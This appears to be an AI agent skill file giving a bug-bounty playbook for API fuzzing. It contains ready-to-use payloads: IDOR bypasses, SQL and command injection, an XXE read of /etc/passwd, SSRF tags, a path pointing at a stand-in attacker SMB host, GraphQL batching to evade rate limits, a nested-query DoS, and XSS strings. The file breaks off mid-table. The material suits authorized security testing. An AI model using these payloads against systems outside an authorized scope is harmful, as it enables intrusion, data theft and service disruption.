---
name: API Fuzzing for Bug Bounty
description: This skill should be used when the user asks to "test API security", "fuzz APIs", "find IDOR vulnerabilities", "test REST API", "test GraphQL", "API penetration testing", "bug bounty API testing", or 
category: Security & Systems
source: antigravity
tags: [python, pdf, api, ai, workflow, document, security, vulnerability, cro]
url: https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/api-fuzzing-bug-bounty
---


# API Fuzzing for Bug Bounty

## Purpose

Provide comprehensive techniques for testing REST, SOAP, and GraphQL APIs during bug bounty hunting and penetration testing engagements. Covers vulnerability discovery, authentication bypass, IDOR exploitation, and API-specific attack vectors.

## Inputs/Prerequisites

- Burp Suite or similar proxy tool
- API wordlists (SecLists, api_wordlist)
- Understanding of REST/GraphQL/SOAP protocols
- Python for scripting
- Target API endpoints and documentation (if available)

## Outputs/Deliverables

- Identified API vulnerabilities
- IDOR exploitation proofs
- Authentication bypass techniques
- SQL injection points
- Unauthorized data access documentation

---

## API Types Overview

| Type | Protocol | Data Format | Structure |
|------|----------|-------------|-----------|
| SOAP | HTTP | XML | Header + Body |
| REST | HTTP | JSON/XML/URL | Defined endpoints |
| GraphQL | HTTP | Custom Query | Single endpoint |

---

## Core Workflow

### Step 1: API Reconnaissance

Identify API type and enumerate endpoints:

```bash
# Check for Swagger/OpenAPI documentation
/swagger.json
/openapi.json
/api-docs
/v1/api-docs
/swagger-ui.html

# Use Kiterunner for API discovery
kr scan https://target.com -w routes-large.kite

# Extract paths from Swagger
python3 json2paths.py swagger.json
```

### Step 2: Authentication Testing

```bash
# Test different login paths
/api/mobile/login
/api/v3/login
/api/magic_link
/api/admin/login

# Check rate limiting on auth endpoints
# If no rate limit → brute force possible

# Test mobile vs web API separately
# Don't assume same security controls
```

### Step 3: IDOR Testing

Insecure Direct Object Reference is the most common API vulnerability:

```bash
# Basic IDOR
GET /api/users/1234 → GET /api/users/1235

# Even if ID is email-based, try numeric
/?user_id=111 instead of /?user_id=user@mail.com

# Test /me/orders vs /user/654321/orders
```

**IDOR Bypass Techniques:**

```bash
# Wrap ID in array
{"id":111} → {"id":[111]}

# JSON wrap
{"id":111} → {"id":{"id":111}}

# Send ID twice
URL?id=<LEGIT>&id=<VICTIM>

# Wildcard injection
{"user_id":"*"}

# Parameter pollution
/api/get_profile?user_id=<victim>&user_id=<legit>
{"user_id":<legit_id>,"user_id":<victim_id>}
```

### Step 4: Injection Testing

**SQL Injection in JSON:**

```json
{"id":"56456"}                    → OK
{"id":"56456 AND 1=1#"}           → OK  
{"id":"56456 AND 1=2#"}           → OK
{"id":"56456 AND 1=3#"}           → ERROR (vulnerable!)
{"id":"56456 AND sleep(15)#"}     → SLEEP 15 SEC
```

**Command Injection:**

```bash
# Ruby on Rails
?url=Kernel#open → ?url=|ls

# Linux command injection
api.url.com/endpoint?name=file.txt;ls%20/
```

**XXE Injection:**

```xml
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
```

**SSRF via API:**

```html
<object data="http://127.0.0.1:8443"/>
<img src="http://127.0.0.1:445"/>
```

**.NET Path.Combine Vulnerability:**

```bash
# If .NET app uses Path.Combine(path_1, path_2)
# Test for path traversal
https://example.org/download?filename=a.png
https://example.org/download?filename=C:\inetpub\wwwroot\web.config
https://example.org/download?filename=\\smb.dns.attacker.com\a.png
```

### Step 5: Method Testing

```bash
# Test all HTTP methods
GET /api/v1/users/1
POST /api/v1/users/1
PUT /api/v1/users/1
DELETE /api/v1/users/1
PATCH /api/v1/users/1

# Switch content type
Content-Type: application/json → application/xml
```

---

## GraphQL-Specific Testing

### Introspection Query

Fetch entire backend schema:

```graphql
{__schema{queryType{name},mutationType{name},types{kind,name,description,fields(includeDeprecated:true){name,args{name,type{name,kind}}}}}}
```

**URL-encoded version:**

```
/graphql?query={__schema{types{name,kind,description,fields{name}}}}
```

### GraphQL IDOR

```graphql
# Try accessing other user IDs
query {
  user(id: "OTHER_USER_ID") {
    email
    password
    creditCard
  }
}
```

### GraphQL SQL/NoSQL Injection

```graphql
mutation {
  login(input: {
    email: "test' or 1=1--"
    password: "password"
  }) {
    success
    jwt
  }
}
```

### Rate Limit Bypass (Batching)

```graphql
mutation {login(input:{email:"a@example.com" password:"password"}){success jwt}}
mutation {login(input:{email:"b@example.com" password:"password"}){success jwt}}
mutation {login(input:{email:"c@example.com" password:"password"}){success jwt}}
```

### GraphQL DoS (Nested Queries)

```graphql
query {
  posts {
    comments {
      user {
        posts {
          comments {
            user {
              posts { ... }
            }
          }
        }
      }
    }
  }
}
```

### GraphQL XSS

```bash
# XSS via GraphQL endpoint
http://target.com/graphql?query={user(name:"<script>alert(1)</script>"){id}}

# URL-encoded XSS
http://target.com/example?id=%C/script%E%Cscript%Ealert('XSS')%C/script%E
```

### GraphQL Tools

| Tool | Purpose |
|------|---------|
| GraphCrawler | Schema discovery |
| graphw00f | Fingerprinting |
| cl
